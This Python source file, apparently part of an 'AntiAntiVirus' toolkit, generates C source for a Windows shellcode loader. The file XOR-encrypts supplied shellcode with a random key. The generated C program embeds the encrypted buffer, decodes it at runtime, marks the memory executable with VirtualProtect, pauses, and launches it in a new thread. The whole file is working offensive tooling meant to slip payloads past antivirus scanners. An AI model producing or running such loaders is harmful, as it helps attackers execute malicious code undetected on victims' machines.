from Web.AntiAntiVirus.EncryptionProcessing import XOR
from ClassCongregation import BinaryDataTypeConversion
import random
def GenerateCode(Shellcode):
    BytesTypeBinaryData=BinaryDataTypeConversion().StringToBytes(Shellcode)#对数据进行类型转换
    GenerateRandomNumber=random.randint(1, 255)#生成的随机数
    XOREncryption=XOR(GenerateRandomNumber,BytesTypeBinaryData)#进行XOR加密
    Code = """
#include <Windows.h>

int main(){

  int shellcode_size = 0; 
  DWORD dwThreadId; 
  HANDLE hThread; 
  DWORD dwOldProtect; 

unsigned char buf[] = \""""+XOREncryption+"""\";

shellcode_size = sizeof(buf);

for(int i = 0;i<shellcode_size; i++){
  buf[i] ^= """+str(GenerateRandomNumber)+""";
}

char * shellcode = (char *)VirtualAlloc(
NULL,
  shellcode_size,
  MEM_COMMIT,
  PAGE_READWRITE
  );
CopyMemory(shellcode,buf,shellcode_size);
VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&dwOldProtect);
Sleep(2000);

hThread = CreateThread(
  NULL, 
  NULL,
  (LPTHREAD_START_ROUTINE)shellcode,
  NULL,
  NULL,
  &dwThreadId
  );

WaitForSingleObject(hThread,INFINITE);
  return 0;
}

"""
    return Code
